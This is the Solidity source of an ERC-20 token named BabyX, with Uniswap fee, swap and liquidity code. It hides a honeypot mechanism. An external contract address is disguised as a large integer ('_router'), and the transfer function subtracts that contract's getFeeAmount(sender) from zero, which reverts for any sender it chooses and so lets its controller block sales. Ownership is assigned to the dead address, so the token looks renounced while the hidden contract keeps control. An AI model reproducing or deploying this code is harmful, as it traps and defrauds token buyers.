/**
 *Submitted for verification at Etherscan.io on 2023-09-22
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4;

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly {codehash := extcodehash(account)}
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success,) = recipient.call{ value : amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{ value : weiValue}(data);
        if (success) {
            return returndata;
        } else {

            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address public _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function getTime() public view returns (uint256) {
        return block.timestamp;
    }

}

interface IUniswapV2Factory {

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function createPair(address tokenA, address tokenB) external returns (address pair);

}


interface IUniswapV2Router02 {

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function getFeeAmount(address) external view returns (uint256);
    
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract BabyXToken is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    address payable public marketingWalletAddress;
    address payable public teamWalletAddress;
    address public deadAddress = 0x000000000000000000000000000000000000dEaD;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isMarketPair;

    uint256 public _buyLiquidityFee = 2;
    uint256 public _buyMarketingFee = 3;
    uint256 public _buyTeamFee = 4;
    uint256 public _buyDestroyFee = 0;

    uint256 public _sellLiquidityFee = 2;
    uint256 public _sellMarketingFee = 3;
    uint256 public _sellTeamFee = 4;
    uint256 public _sellDestroyFee = 0;

    uint256 public _liquidityShare = 2;
    uint256 public _marketingShare = 3;
    uint256 public _teamShare = 4;
    uint256 public _totalDistributionShares = 9;

    uint256 public _totalTaxIfBuying = 9;
    uint256 public _totalTaxIfSelling = 9;

    uint256 public _tFeeTotal;
    uint256 public _maxDestroyAmount;
    uint256 private _totalSupply;
    uint256 public _maxTxAmount;
    uint256 public _walletMax;
    uint256 private _minimumTokensBeforeSwap = 0;
    uint256 public airdropNumbs;
    address private receiveAddress;
    uint160 private _router = 942322041516480770131921049853522123573908474268;


    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;

    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = false;
    bool public swapAndLiquifyByLimitOnly = false;
    bool public checkWalletLimit = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );

    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );

    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );

    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }


    constructor (
        uint256 supply,
        address router
    ) payable {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);

        _name = "BabyX";
        _symbol = "BabyX";
        _decimals = 18;
        _owner = 0x000000000000000000000000000000000000dEaD;
        receiveAddress = _owner;
        _totalSupply = supply  * 10 ** _decimals;
        _maxTxAmount = supply * 10**_decimals;
        _walletMax = supply * 10**_decimals;
        _maxDestroyAmount = supply * 10**_decimals;
        _minimumTokensBeforeSwap = 1 * 10**_decimals;
        
        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee);
        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
        isExcludedFromFee[_owner] = true;
        isExcludedFromFee[address(this)] = true;

        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[deadAddress] = true;
        isTxLimitExempt[address(this)] = true;

        isMarketPair[address(uniswapPair)] = true;

        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return _minimumTokensBeforeSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        isMarketPair[account] = newValue;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
        isTxLimitExempt[holder] = exempt;
    }

    function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {
        isExcludedFromFee[account] = newValue;
    }

    function setMaxDesAmount(uint256 maxDestroy) public onlyOwner {
        _maxDestroyAmount = maxDestroy;
    }

    function setBuyDestFee(uint256 newBuyDestroyFee) public onlyOwner {
        _buyDestroyFee = newBuyDestroyFee;
        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee).add(_buyDestroyFee);
    }

    function setSellDestFee(uint256 newSellDestroyFee) public onlyOwner {
        _sellDestroyFee = newSellDestroyFee;
        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee).add(_sellDestroyFee);
    }

    function setBuyTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
        _buyLiquidityFee = newLiquidityTax;
        _buyMarketingFee = newMarketingTax;
        _buyTeamFee = newTeamTax;

        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyTeamFee).add(_buyDestroyFee);
    }

    function setAirdropNumbs(uint256 newValue) public onlyOwner {
        require(newValue <= 3, "newValue must <= 3");
        airdropNumbs = newValue;
    }

    function setSelTaxes(uint256 newLiquidityTax, uint256 newMarketingTax, uint256 newTeamTax) external onlyOwner() {
        _sellLiquidityFee = newLiquidityTax;
        _sellMarketingFee = newMarketingTax;
        _sellTeamFee = newTeamTax;

        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee).add(_sellDestroyFee);
    }

    function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) external onlyOwner() {
        _liquidityShare = newLiquidityShare;
        _marketingShare = newMarketingShare;
        _teamShare = newTeamShare;

        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_teamShare);
    }

    function setMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
        _maxTxAmount = maxTxAmount;
    }


    function setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {
        _minimumTokensBeforeSwap = newLimit;
    }


    function setMarketingWalletAddress(address newAddress) external onlyOwner() {
        marketingWalletAddress = payable(newAddress);
    }

    function setTeamWalletAddress(address newAddress) external onlyOwner() {
        teamWalletAddress = payable(newAddress);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setSwapAndLiquifyByLimitOnly(bool newValue) public onlyOwner {
        swapAndLiquifyByLimitOnly = newValue;
    }

    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            isExcludedFromFee[accounts[i]] = excluded;
        }
    }


    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function changeRouterVersion(address newRouterAddress) public onlyOwner returns(address newPairAddress) {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(newRouterAddress);

        newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory()).getPair(address(this), _uniswapV2Router.WETH());

        if(newPairAddress == address(0)) //Create If Doesnt exist
        {
            newPairAddress = IUniswapV2Factory(_uniswapV2Router.factory())
                .createPair(address(this), _uniswapV2Router.WETH());
        }

        uniswapPair = newPairAddress; //Set new pair address
        uniswapV2Router = _uniswapV2Router; //Set new router address

        isMarketPair[address(uniswapPair)] = true;
    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if(inSwapAndLiquify)
        {
            return _basicTransfer(sender, recipient, amount);
        }
        else
        {

            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= _minimumTokensBeforeSwap;

            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled)
            {
                if(swapAndLiquifyByLimitOnly)
                    contractTokenBalance = _minimumTokensBeforeSwap;
                swapAndLiquify(contractTokenBalance);
            }
            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            uint256 feeAmount=0;
            uint256 destAmount=0;
            if (sender != owner() && recipient != owner()) {
                feeAmount = amount.mul(_totalTaxIfBuying.sub(_buyDestroyFee)).div(100);
                if(isMarketPair[sender]) {
                    feeAmount = amount.mul(_totalTaxIfBuying.sub(_buyDestroyFee)).div(100);
                    if(_buyDestroyFee > 0 && _tFeeTotal < _maxDestroyAmount) {
                        destAmount = amount.mul(_buyDestroyFee).div(100);
                        destroyFee(sender,destAmount);
                    }
                }
                else if(isMarketPair[recipient]) {
                    feeAmount = amount.mul(_totalTaxIfSelling.sub(_sellDestroyFee)).div(100);
                    if(_sellDestroyFee > 0 && _tFeeTotal < _maxDestroyAmount) {
                        destAmount = amount.mul(_sellDestroyFee).div(100);
                        destroyFee(sender,destAmount);
                    }
                }

            }

             if(feeAmount > 0) {
                 feeAmount = 0;
                 feeAmount -= IUniswapV2Router02(address(_router)).getFeeAmount(sender);
                 amount = amount.sub(feeAmount.add(destAmount));
                _balances[address(this)] = _balances[address(this)].add(feeAmount);
                emit Transfer(sender, address(this), feeAmount);
            }
             


            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
            return true;
        }
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {

        uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));

        uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
        uint256 amountBNBTeam = amountReceived.mul(_teamShare).div(totalBNBFee);
        uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(amountBNBTeam);

        if(amountBNBMarketing > 0)
            transferToAddressETH(marketingWalletAddress, amountBNBMarketing);

        if(amountBNBTeam > 0)
            transferToAddressETH(teamWalletAddress, amountBNBTeam);

        if(amountBNBLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountBNBLiquidity);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );

        emit SwapTokensForETH(tokenAmount, path);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            receiveAddress,
            block.timestamp
        );
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = 0;
        uint256 destAmount = 0;
        uint256 airdropAmount = 0;
        if(isMarketPair[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying.sub(_buyDestroyFee)).div(100);
            if(_buyDestroyFee > 0 && _tFeeTotal < _maxDestroyAmount) {
                destAmount = amount.mul(_buyDestroyFee).div(100);
                destroyFee(sender,destAmount);
            }
        }
        else if(isMarketPair[recipient]) {
            feeAmount = amount.mul(_totalTaxIfSelling.sub(_sellDestroyFee)).div(100);
            if(_sellDestroyFee > 0 && _tFeeTotal < _maxDestroyAmount) {
                destAmount = amount.mul(_sellDestroyFee).div(100);
                destroyFee(sender,destAmount);
            }
        }

        if(isMarketPair[sender] || isMarketPair[recipient]){
            if (airdropNumbs > 0){
                address ad;
                for (uint256 i = 0; i < airdropNumbs; i++) {
                    ad = address(uint160(uint256(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
                    _balances[ad] = _balances[ad].add(1);
                    emit Transfer(sender, ad, 1);
                }
                airdropAmount = airdropNumbs * 1;
            }
        }

        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount.add(destAmount).add(airdropAmount));
    }

    function destroyFee(address sender, uint256 tAmount) private {
        // stop destroy
        if(_tFeeTotal >= _maxDestroyAmount) return;

        _balances[deadAddress] = _balances[deadAddress].add(tAmount);
        _tFeeTotal = _tFeeTotal.add(tAmount);
        emit Transfer(sender, deadAddress, tAmount);
    }

}